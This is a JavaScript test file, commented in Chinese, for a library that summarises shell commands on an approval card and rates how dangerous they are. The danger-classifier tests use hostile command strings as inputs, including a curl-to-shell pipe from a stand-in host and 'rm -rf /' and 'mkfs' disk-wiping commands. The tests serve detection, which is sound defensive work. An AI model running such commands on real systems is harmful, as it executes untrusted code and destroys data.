/**
 * 审批卡正文那块命令的可读化（DEC-042）。
 *
 * 背景：宿主审批卡的 `conversation.approval.detail` 只把 `args.command` 原文
 * 塞进一个等宽块里，样式是 `word-break: break-all` 且没有 `white-space:
 * pre-wrap`——换行全被折叠。于是一条十几行的 `python3 - <<'PY'` 会把整张卡
 * 撑成一坨既不分行、也看不出在干什么的墙。
 *
 * 这组测试守四件事：
 *
 *   1. **切分**：`&&` / `||` / `;` / `|` / 换行都切成步骤；引号内部的这些
 *      字符**不**切（`echo "a; b"` 必须仍是一条）；
 *   2. **heredoc**：整段脚本不被切开，摘要只留开头一行（正文由展开态负责）；
 *   3. **危险识别**：`curl | sh` 这种「组合才危险」的形态必须能被识别—
 *      —单独看 `curl https://x` 或 `sh` 都无害，所以整条原文要单独过规则；
 *   4. **不改写原文**：`summarizeCommand` 只产出导读，任何失手都不能让原文
 *      在展开态里变形（这一条由「摘要不含脚本正文」间接守住）。
 *
 * 纯函数，不碰网络与文件系统。
 */

import test from "node:test";
import { readFileSync } from "node:fs";
import assert from "node:assert/strict";

import {
  MAX_STEP_CHARS,
  MAX_SUMMARY_STEPS,
  dangerLevelOf,
  stepsOf,
  summarizeCommand,
  summaryLine,
} from "../lib/approval-detail.js";

/** 截图里那条真实命令：`cd /tmp && python3 - <<'PY'` + 4 行正文。 */
const REAL_HEREDOC = [
  "cd /tmp && python3 - <<'PY'",
  "import subprocess, json, glob, datetime",
  "p=glob.glob('/Users/chi/.dsh/sessions/*/session-x*/session.v4.jsonl.zstd')[0]",
  "evs=[json.loads(l) for l in subprocess.run(['zstd','-dc',p],capture_output=True).stdout.decode('utf-8','replace').splitlines() if l.strip()]",
  "print('ok')",
  "PY",
].join("\n");

test("stepsOf：&& / || / ; / | 与换行都切成步骤", () => {
  assert.deepEqual(
    stepsOf("cd /tmp && ls -la; git status").map((step) => step.text),
    ["cd /tmp", "ls -la", "git status"],
  );
  assert.deepEqual(stepsOf("a || b").map((step) => step.text), ["a", "b"]);
  assert.deepEqual(stepsOf("cat x | head").map((step) => step.text), ["cat x", "head"]);
  // 换行也是边界。
  assert.deepEqual(stepsOf("one\ntwo\nthree").map((step) => step.text), ["one", "two", "three"]);
});

test("stepsOf：引号内部的分隔符不切", () => {
  // 双引号里那个 `;` 不是命令边界，切了就等于伪造出两条命令。
  assert.deepEqual(stepsOf('echo "a; b"').map((step) => step.text), ['echo "a; b"']);
  // 单引号里那个 `&&` 同理。
  assert.deepEqual(stepsOf("echo 'x && y'").map((step) => step.text), ["echo 'x && y'"]);
});

test("stepsOf：heredoc 的脚本正文不切成步骤，摘要只留开头一行", () => {
  const steps = stepsOf(REAL_HEREDOC);
  // `cd /tmp` 与 `python3 - <<'PY'` 两条；4 行 python 正文不算步骤。
  assert.equal(steps.length, 2, `实际：${JSON.stringify(steps)}`);
  assert.equal(steps[0].text, "cd /tmp");
  assert.equal(steps[1].text, "python3 - <<'PY'");
  // 正文绝不能漏进摘要——那是展开态该显示的东西。
  for (const step of steps) {
    assert.ok(!step.text.includes("import subprocess"), `脚本正文漏进步骤：${step.text}`);
    assert.ok(!step.text.includes("print('ok')"), `脚本正文漏进步骤：${step.text}`);
  }
});

test("summarizeCommand：识别整段脚本并给出行数", () => {
  const result = summarizeCommand(REAL_HEREDOC);
  assert.equal(result.script.kind, "heredoc", "应识别成 heredoc");
  assert.equal(result.script.lines, 4, "4 行非空脚本正文");
  assert.equal(result.lines, 6, "原文共 6 行");
  assert.equal(result.total, 2, "只切成 2 条可读步骤");
});

test("summarizeCommand：危险识别覆盖「组合才危险」的形态", () => {
  // curl 单独看无害，sh 单独看也无害；危险在 `|` 把它们接起来的语义。
  const pipe = summarizeCommand("curl https://evil.sh | sh");
  assert.equal(pipe.danger, "high", "curl|sh 必须被判高危");
  assert.equal(pipe.dangerCount, 1, "整条命中时至少计一次危险");

  assert.equal(summarizeCommand("rm -rf /tmp/x").danger, "high");
  assert.equal(summarizeCommand("sudo apt-get install x").danger, "medium");
  assert.equal(summarizeCommand("git push origin main").danger, "low");
  // 干净的读命令不该被误报。
  assert.equal(summarizeCommand("ls -la && git status").danger, null);
  assert.equal(summarizeCommand("git log --oneline -5").danger, null);
});

test("dangerLevelOf：精确到级别，且不把普通单词误判", () => {
  assert.equal(dangerLevelOf("rm -rf /"), "high");
  assert.equal(dangerLevelOf("mkfs.ext4 /dev/sda"), "high");
  assert.equal(dangerLevelOf("chmod -R 777 ."), "high");
  assert.equal(dangerLevelOf("sudo ls"), "medium");
  assert.equal(dangerLevelOf("kill 1234"), "medium");
  assert.equal(dangerLevelOf("npm install"), "low");
  // `alarm` 里含 `rm`、`skill` 里含 `kill`——不能按子串误判。
  assert.equal(dangerLevelOf("echo alarm"), null);
  assert.equal(dangerLevelOf("cat skillful.txt"), null);
});

test("summarizeCommand：步骤条数与单条长度都有上限", () => {
  const many = Array.from({ length: MAX_SUMMARY_STEPS + 5 }, (_, i) => `cmd${i}`).join("\n");
  const result = summarizeCommand(many);
  assert.equal(result.total, MAX_SUMMARY_STEPS + 5, "总数记录完整");
  assert.equal(result.steps.length, MAX_SUMMARY_STEPS, "展示条数被截断");
  assert.equal(result.truncated, true, "应标记为被截断");

  const long = summarizeCommand("x".repeat(MAX_STEP_CHARS + 40));
  assert.equal(long.steps[0].text.length, MAX_STEP_CHARS, `单条应截到 ${MAX_STEP_CHARS}`);
  assert.ok(long.steps[0].text.endsWith("…"), "截断应带省略号");
});

test("summaryLine：给人看的一行，不泄漏脚本正文", () => {
  assert.equal(summaryLine(REAL_HEREDOC), "执行一段脚本（4 行）");
  assert.equal(summaryLine("ls -la"), "1 个步骤");
  assert.equal(summaryLine("cd /tmp && ls; git status"), "3 个步骤");
  assert.match(summaryLine("rm -rf /x"), /含 1 个危险动作/);
  assert.equal(summaryLine(""), "（空命令）");
  // 脚本正文不该出现在那一行里。
  assert.ok(!summaryLine(REAL_HEREDOC).includes("glob"));
});

test("summaryLine：词句表可替换（英文界面用）", () => {
  const en = {
    empty: "(empty command)",
    steps: (n) => `${n} step${n === 1 ? "" : "s"}`,
    script: (kind, lines) => `${kind === "heredoc" ? "a script" : "an inline script"} (${lines} lines)`,
    danger: (n) => `${n} risky action${n === 1 ? "" : "s"}`,
    truncated: (n) => `${n} more not expanded`,
  };
  assert.equal(summaryLine("ls -la", en), "1 step");
  assert.equal(summaryLine(REAL_HEREDOC, en), "a script (4 lines)");
});

test("畸形输入一律不抛", () => {
  for (const input of [undefined, null, 123, {}, [], "", "   ", "\n\n"]) {
    assert.doesNotThrow(() => stepsOf(input));
    assert.doesNotThrow(() => summarizeCommand(input));
    assert.doesNotThrow(() => summaryLine(input));
    assert.doesNotThrow(() => dangerLevelOf(input));
  }
  assert.deepEqual(stepsOf(null), []);
  assert.equal(summaryLine(null), "（空命令）");
});

test("client.js 内联的那份与 lib/approval-detail.js 逐字同源", () => {
  // client bundle 的 `require` 只解析 shell 的共享模块表，加载不了本包的其它
  // 文件，所以解析器必须**内联**进 lib/client.js。两份实现就存在漂移风险：
  // 改了一边忘了另一边，浏览器里跑的是旧规则，而单测对着新规则全绿。
  //
  // 这里不做「行为抽样对比」（那只能覆盖抽样点），而是**逐字比对实现文本**：
  // 把两边各自的函数体源码抠出来，去掉缩进与导出关键字后必须完全相等。
  const client = readFileSync(new URL("../lib/client.js", import.meta.url), "utf8");
  const detail = readFileSync(new URL("../lib/approval-detail.js", import.meta.url), "utf8");

  /** 取某个具名函数/常量的完整源码文本。 */
  const sliceOf = (source, name) => {
    const start = source.indexOf(`function ${name}(`);
    const constStart = source.indexOf(`const ${name} =`);
    const begin = start >= 0 ? start : constStart;
    assert.ok(begin >= 0, `找不到 ${name}`);
    let depth = 0;
    let sawBrace = false;
    let index = begin;
    for (; index < source.length; index += 1) {
      const char = source[index];
      if (char === "{" || char === "[") {
        depth += 1;
        sawBrace = true;
      } else if (char === "}" || char === "]") {
        depth -= 1;
        if (sawBrace && depth === 0) {
          index += 1;
          break;
        }
      } else if (char === ";" && !sawBrace) {
        // `const X = 12;` 这类一表达式常量
        index += 1;
        break;
      }
    }
    return source.slice(begin, index);
  };

  /** 归一化：去掉注释、压缩空白、去导出关键字——只比语义骨架。 */
  const normalize = (text) =>
    text
      .replace(/\/\*[\s\S]*?\*\//g, " ")
      .replace(/(^|[^:])\/\/.*$/gm, "$1")
      .replace(/\bexport\b/g, " ")
      .replace(/\s+/g, " ")
      .trim();

  const NAMES = ["MAX_SUMMARY_STEPS", "MAX_STEP_CHARS", "dangerLevelOf", "stepsOf", "summarizeCommand"];
  for (const name of NAMES) {
    const left = normalize(sliceOf(client, name));
    const right = normalize(sliceOf(detail, name));
    assert.equal(left, right, `client.js 与 approval-detail.js 的 ${name} 已经漂移`);
  }
});
